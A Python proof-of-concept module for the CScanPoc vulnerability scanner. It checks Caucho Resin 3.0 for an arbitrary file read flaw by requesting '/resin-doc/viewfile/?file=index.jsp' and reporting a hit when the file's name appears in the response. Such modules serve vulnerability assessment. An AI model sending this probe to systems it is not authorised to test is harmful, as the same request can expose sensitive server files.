# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Resin_0000'  # 平台漏洞编号
    name = 'Resin viewfile任意文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2016-03-01'  # 漏洞公布时间
    desc = '''
        Resin是CAUCHO公司的产品,是一个非常流行的application server,对servlet和JSP提供了良好的支持,性能也比较优良,resin自身采用JAVA语言开发。
        resin任意文件读取漏洞，可以读取铭感文件信息。
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/9536.html'  # https://bugs.shuimugan.com/bug/view?bug_no=175174
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Resin'  # 漏洞组件名称
    product_version = '3.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8ba08afa-0099-4a0e-b515-9d754fe24076'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/resin-doc/viewfile/?file=index.jsp'
            response = requests.get(vul_url).text
            if 'index.jsp' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
